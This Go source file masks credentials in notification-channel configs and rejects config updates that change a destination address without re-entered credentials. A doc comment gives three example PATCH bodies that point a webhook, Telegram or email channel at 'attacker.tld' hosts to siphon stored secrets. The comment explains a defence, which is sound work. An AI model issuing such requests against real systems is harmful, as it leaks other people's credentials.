package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes credentials, the
// real content is replaced by a value carrying this prefix; when the update endpoint receives
// such a value it means "keep the stored value unchanged".
//
// A prefix rather than an empty string or a fixed constant, so it can also carry a little
// identifying information (see MaskedValue): the user can tell which bot this is without
// re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue builds a masked value:
//
//	"__masked__"              the original value is too short, no hint is given
//	"__masked__:…ab12cd"      the last 6 characters of the original value as a hint
//
// Exposing only the last 6 characters is deliberate: the identifying part of a webhook URL sits
// at the end (the WeCom key, the Feishu bot id), while the prefix is identical for every bot and
// identifies nothing. Six characters cannot reconstruct the credential but are enough for the
// operator to recognise "that is my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked (i.e. echoed by the API and left unmodified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with this channel's credential fields replaced by
// masked values.
//
// An unknown channel kind returns an empty map instead of the original config: better for the UI
// to show "config unavailable" than to hand back content that may hold credentials when the
// channel kind cannot be recognised. Non-credential fields are kept as-is so the UI can still
// render them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure such as headers is masked as one whole credential: deciding per
		// sub-key would need a second "which sub-keys are credentials" rule per channel, far
		// more complexity than it is worth.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed but the caller said
// nothing about the credential fields". It is returned instead of silently allowing the update
// or silently dropping the credentials; see PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys left unspecified
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return fmt.Sprintf("destination address (%s) changed; re-enter the credential fields too (%s): provide new values, or leave them empty to signal that credentials are no longer needed. Existing credentials are only valid for the previous address, so reusing them would hand them to the new address.", strings.Join(e.Changed, ", "), strings.Join(e.Missing, ", "))
}

// PrepareConfigUpdate merges a channel config and handles the security-sensitive "destination
// changed" case.
//
// It is used instead of a bare MergeConfig on the channel update path because of a practically
// exploitable path: the destination (where messages go) and the credentials (which identity sends
// them) are separate fields, and MergeConfig keeps the stored value for every key that is not
// mentioned. So anyone able to PATCH a channel could **change only the address and say nothing
// about the credentials**, making the server send the stored credentials to an endpoint they
// control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  -> the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    -> username and password handed over after STARTTLS
//
// That path is completely silent, needs no redirect (so refusing cross-host redirects does not
// stop it), and defeats the very goal of this package's masking -- "credentials are never echoed
// back to the browser".
//
// Rule: as soon as a destination key is set to a new value, the caller must state **every**
// credential key explicitly:
//   - a new value -> use it
//   - an explicit empty string -> the field no longer needs a credential (clearing still works)
//   - echoing the masked value back / omitting the key -> rejected
//
// The third case is rejected because a "masked value" means exactly "keep the old credential",
// and the old credential is only valid for the old address. Silently dropping the credentials is
// deliberately not done either: for optional credential fields (webhook headers, email password)
// that would silently turn into "no auth any more but the endpoint still returns 200", which is
// harder to diagnose than an error. Better to make the operator retype it once.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("unregistered channel type: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// A non-string credential value (webhook headers is an object) holding a masked literal means
	// the caller pushed the "keep the old value" sentinel inside the structure. MergeConfig only
	// treats prefixed **strings** as masked, so this shape would be stored as a plain object -- the
	// literal "__masked__" really lands in the database and later auth fails silently with no
	// error at all. Rejected instead.
	//
	// This check must run **first**: when the address did not change the function returns early,
	// so putting it later would only cover the "address changed" path (the first version had it in
	// the wrong place and the tests caught it immediately).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that really changed. A masked value counts as unchanged.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address did not change: plain merge (masked values keep the stored value, an empty string clears, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: every credential key must be stated explicitly.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting the masking sentinel inside a non-string
// structure.
//
// Masking relies on "the whole value is one string". An object field such as webhook headers can
// only be masked as a whole (by writing the string "__masked__") or submitted as a whole: putting
// the sentinel inside the object cannot express "keep unchanged" and would be stored as a real
// value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("%s field contains the mask marker (%q). Leave the whole field empty to keep the existing value, or submit the whole field with a new value; the mask marker cannot be nested inside a structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue reports whether two config values are equivalent. Comparing the JSON encoding
// covers type differences along the way -- the frontend submits the port as a number while the
// database reads it back as a float64, so a direct == would misreport it.
//
// "Blank" must be normalised before comparing: in this config model an empty string and a missing
// key are the same state, because MergeConfig treats an empty string as an explicit clear and
// deletes the key. Without normalising, an optional destination field that is always left empty
// (Telegram's base_url is the only such field: empty means the official endpoint) would take
// this path --
//
//	base_url:"" stored at creation  ->  the first save deletes the key via MergeConfig
//	-> on the second save incoming is "" and stored has no key, so it looks like "destination changed"
//	-> the credentials are masked values -> 400 "destination changed, please re-enter the credential fields"
//
// After that every save fails unless the user re-pastes the bot token, having changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a config value counts as blank.
// It must agree with MergeConfig's clearing rule (strings.TrimSpace(s) == ""), otherwise a gap
// appears where MergeConfig deletes a key while sameConfigValue still sees a value.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored to update a channel config.
//
// Rules:
//   - a key whose incoming value is masked -> keep the stored value (the user did not edit it)
//   - a key whose incoming value is an empty string -> an explicit clear, delete the key
//   - any other key -> overwrite with the incoming value
//   - a key present in stored but absent from incoming -> keep it (partial update semantics)
//
// Whether an empty string counts as "clear" has to be decided: the frontend form submits
// untouched fields as empty strings, and writing that as a meaningful value would really wipe
// fields that are meant to mean "leave empty to keep". An explicit clear wins here, because a
// user has no other way to remove a field that was set by mistake (a patch-style sentinel could
// tell "absent" from "empty", but the UI has no use for that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
